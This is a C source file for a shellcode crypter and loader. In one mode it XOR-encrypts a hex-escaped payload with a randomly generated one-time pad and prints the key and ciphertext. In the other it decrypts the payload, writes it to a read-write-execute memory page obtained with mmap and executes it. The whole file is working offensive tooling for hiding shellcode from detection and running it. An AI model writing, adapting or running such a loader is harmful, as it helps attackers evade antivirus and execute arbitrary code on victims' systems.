#include <bsd/stdlib.h>
#include <sys/mman.h>

#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>


extern char *__progname;

void decrypt(char *, char *);
void encrypt(char *);
void fatal( char * );
void h2b(char *);
void usage();

enum modus { 
    mod_encrypt = 0,
    mod_decrypt = 1
} ;

int 
main( int argc, char **argv )
{

    if ( argc < 3 )
        usage();

    char ch;
    char *payload;
    char *dec_key;
    enum modus progmod;
    
    while ((ch = getopt(argc, argv, "e:d:k:")) != -1)

            switch (ch) {
                                        
            case 'e':
                payload = optarg;
                progmod = mod_encrypt;
                break;
            case 'd':
                payload = optarg; 
                progmod = mod_decrypt;
                break;
            case 'k':
                dec_key = optarg;
                break;
            default:
                usage();
                break;

            }

    if ( progmod == mod_encrypt )
        encrypt( payload );
    else
        decrypt( payload, dec_key );

    printf("[+] Bye\n");

    return 0;
}

void 
encrypt( char *payload )
{

    printf("[*] Crypting your payload ... \n");
    // Convert \x byte representation to byte array
    h2b(payload);
    int len_payload = strlen(payload);
    char xor_key[len_payload];
    unsigned char b;

    arc4random_buf(xor_key, sizeof xor_key);
    printf("[+] Generated One-time pad of length: %d\n", len_payload);
    for ( int i = 0 ; i < len_payload; ++i ) {
        b = (xor_key[i] & 0xff);
        if ( b < 0x10 )
            printf("\\x0%x", b);
        else
            printf("\\x%x", b);
    }

    printf("\n");

    // Actually encrypt
    for ( int i = 0; i < len_payload; ++i )
        payload[i] ^= xor_key[i];

    printf("[+] Encryption done:\n");
    for ( int i = 0 ; i < len_payload; ++i ) {
        b = (payload[i] & 0xff);
        if ( b < 0x10 )
            printf("\\x0%x", b);
        else
            printf("\\x%x", b);
    }

    printf("\n");

}

void
decrypt( char *payload, char *dec_key )
{
    printf("[*] Starting decrypting .. \n");

    h2b(payload);
    h2b(dec_key);

    int len_payload = strlen(payload);
    for ( int i = 0; i < len_payload ; ++i )
        payload[i] ^= dec_key[i];

    printf("[*] Decryption done ... \n");

    printf("[*] Create executable page and write shellcode to it \n");
    void *page = mmap( NULL, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC,
            MAP_ANONYMOUS | MAP_PRIVATE, 0, 0);

    if ( page == MAP_FAILED )
        fatal(NULL);

    if ( len_payload > 0x1000 )
        fatal(NULL); // WTF SHELLCODE!?

    memcpy( page, payload, len_payload);
    printf("[*] Executing shellcode\n");
    ((void(*)()) page)();

}

void 
h2b( char *hex )
{

    int len = strlen(hex) / 3;
    int idx = 0;
    unsigned char tmp[len + 1];
    unsigned char buf[3];

    for ( int i = 1; i < strlen(hex); i+=3 ) {
        sprintf(buf, "%c%c", hex[i], hex[i + 1]);
        tmp[idx] = strtol(buf, NULL, 16);
        ++idx;
    }

    memcpy(hex, tmp, idx);
    hex[idx] = 0x00;

}

void
fatal(char *msg)
{
    perror("Fatal: ");
    exit( 1 );
}

void
usage()
{
    (void)fprintf(stderr, "usage: %s [-e encrypt payload] [-d decrypt ] [-k key]\n", __progname);
    exit(1);
}
